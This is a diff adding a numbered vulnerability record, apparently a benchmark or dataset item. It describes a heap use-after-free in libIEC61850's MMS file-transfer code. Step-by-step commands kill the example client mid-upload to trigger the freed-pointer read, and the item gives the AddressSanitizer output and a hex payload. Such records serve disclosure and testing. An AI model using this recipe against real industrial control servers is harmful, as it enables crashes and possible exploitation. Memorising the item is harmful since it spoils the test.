@@ -1,0 +1,34 @@
+Number: 597
+
+Summarize:
+libIEC61850 v1.6_develop HEAD commit 196bb76 contains a heap use-after-free in the MMS file service. During an ObtainFile / set-file transfer, MmsObtainFileTask retains a raw MmsServerConnection pointer. If the peer disconnects unexpectedly, disconnect handling only sets the task to MMS_FILE_UPLOAD_STATE_INTERRUPTED, and the connection is then freed by MmsServerConnection_destroy without task->connection being cleared. On the next background-task pass, mmsServer_fileUploadTask in src/mms/iso_mms/server/mms_file_service.c dereferences task->connection->isoConnection before the interrupted-state cleanup runs. The provided AddressSanitizer trace shows a heap-use-after-free read in mmsServer_fileUploadTask, with the connection freed in MmsServerConnection_destroy.
+
+Reproduce:
+Use the ASan-built official example server and client shown in the document.
+
+Terminal 1:
+cd /tmp/libiec61850-uaf/file_server
+/.../libiec61850/build-asan/examples/server_example_files/server_example_files 11013
+Expected startup banner:
+Using libIEC61850 version 1.6.1
+
+Terminal 2: start the official example client and let timeout kill it during the upload:
+cd /tmp/libiec61850-uaf/file_client
+timeout -s KILL 1.0s /.../libiec61850/build-asan/examples/iec61850_client_example_files/file-tool -h 127.0.0.1 -p 11013 set big.bin
+Important: use the relative path exactly as shown: set big.bin
+
+Observed client output:
+local dir: .
+local file: big.bin
+filestore basepath: ./
+Killed
+
+Observed server output includes:
+Using libIEC61850 version 1.6.1
+Connection opened
+fileAccessHandler: service = 2, local-file: big.bin other-file: big.bin
+Connection closed
+Then AddressSanitizer reports a heap-use-after-free READ of size 8 in mmsServer_fileUploadTask at src/mms/iso_mms/server/mms_file_service.c:487:53; the trace shows the free in MmsServerConnection_destroy and the allocation in MmsServerConnection_init.
+
+Payload:
+62 69 67 2e 62 69 6e
